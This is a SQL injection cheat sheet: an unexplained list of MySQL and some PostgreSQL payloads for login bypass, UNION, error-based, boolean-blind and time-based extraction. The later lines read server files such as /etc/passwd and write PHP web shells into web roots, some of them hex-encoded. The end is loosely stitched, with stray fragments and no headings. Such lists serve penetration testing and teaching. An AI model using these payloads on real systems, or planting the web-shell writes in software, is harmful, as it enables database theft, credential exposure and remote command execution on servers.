## Numeric: Query like SELECT * FROM Table WHERE id = FUZZ;
```sql
AND 1
AND true
```

## Login: Query like SELECT * FROM Users WHERE username = 'FUZZ1' AND password = 'FUZZ2';
```sql
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' AND '1'='1
```

## MYSQL Union Based
### Iterative NULL Method
```sql
UNION SELECT NULL;--
UNION SELECT NULL, NULL;--
```

## ORDER BY Method
```sql
ORDER BY 1 --+
GROUP BY 1--+
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=PLACEHOLDER
1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)
```

## Mysql error-based
```sql
AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -
AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -
AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -
AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -
AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -
OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -
AND UUID_TO_BIN(version())='1
```

## MYSQL Error Based - Basic
```sql
(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))
'+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))+'
```

## MYSQL Error Based - UpdateXML Function
```sql
AND UPDATEXML(rand(),CONCAT(CHAR(126),version(),CHAR(126)),null)-
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
```

## MYSQL Error Based - Extractvalue Function
```sql
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(CHAR(126),VERSION(),CHAR(126)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),data_column,CHAR(126)) FROM data_schema.data_table LIMIT data_offset,1)))--
```

## MYSQL Blind Based
```sql
2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2
?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(version()))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(version(),POS,1)),1)
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(concat(login,password)))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(concat(login,password),POS,1)),1)
' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --
' OR (SELECT username FROM users WHERE username REGEXP '[0-9]') --
' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --
```

## MYSQL Time Based

AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
AND SLEEP(10)=0
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '___')# 
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '____')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '_____')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'A____')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'S____')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SA___')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SW___')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWA__')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWB__')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWI__')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=DATABASE() AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%')#
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1))>=100, 1, SLEEP(3)) --
?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2


UNION SELECT 1,(SELECT(@)FROM(SELECT(@:=0X00),(SELECT(@)FROM(information_schema.processlist)WHERE(@)IN(@:=CONCAT(@,0x3C62723E,state,0x3a,info))))a),3,4 #
UNION ALL SELECT LOAD_FILE('/etc/passwd') --
UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
[...] UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
[...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
`username` varchar(20) not null
%A8%27 OR 1=1;--
%8C%A8%27 OR 1=1--
%bf' OR 1=1 -- --
' UNION SELECT CURRENT_USER,NULL WHERE USER SIMILAR TO 'AS%' --
' OR CASE WHEN SUBSTR((SELECT flag FROM flag),1,1)='F' THEN 1 ELSE (1/0) END AND '1
username=ittt"+union+select+username,flag,"9990775155c3518a0d7917f7780b24aa"+from+users+inner+join+flags+on+username+like+"ittt%"--&email=wee%40wee.com&password=ttt
" AND SUBSTR((SELECT DATABASE()), {position}, 1) = '{char}' -- "
" AND SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema='{database_name}' LIMIT {table_index}, 1), {position}, 1) = '{char}' -- " 
' AND 1=CAST((SELECT 1) AS int)--
' || (SELECT case when (1=1) then pg_sleep(5) else pg_sleep(-1) end)--
' union select 0x27206F726465722062792033202D2D202D -- -






